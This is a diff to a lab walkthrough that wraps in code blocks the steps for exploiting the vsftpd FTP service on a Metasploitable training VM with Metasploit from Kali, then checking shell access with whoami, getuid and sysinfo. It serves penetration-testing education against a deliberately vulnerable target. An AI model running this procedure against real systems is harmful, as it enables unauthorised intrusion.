@@ -34,28 +34,34 @@ nmap -sS -sV -O <Metasploitable-IP>
 ### Step 4: Search for the vulnerable FTP service in Metasploit
 
 Start the Metasploit Framework using `msfconsole` and search for modules related to **vsftpd**. From the search results, select the appropriate exploit module for the vulnerable FTP service and load the module.
+```bash
 msfconsole
 search vsftpd
 use <exploit-module>
+```
 
 ![Step 4 Screenshot](images/step_4.jpg)
 
 ### Step 5: Configure the exploit module
 
 Configure the exploit with the IP address of the Metasploitable target as **RHOST** and the IP address of Kali Linux as **LHOST**.
+```bash
 set RHOST <Metasploitable-IP>
 set LHOST <Kali-IP>
+```
 
 ![Step 5 Screenshot](images/step_5.jpg)
 
 ### Step 6: Execute the exploit and verify access
 
 Execute the configured exploit using `exploit` or `run`. After obtaining a shell on the target, verify the access and execute basic Linux commands such as `whoami`, `getuid`, `sysinfo`, and create a directory to demonstrate interaction with the target system.
+```bashbash
 exploit
 whoami
 getuid
 sysinfo
 mkdir <your-name>
+```
 
 ![Step 6 Screenshot](images/step_6.jpg)
 
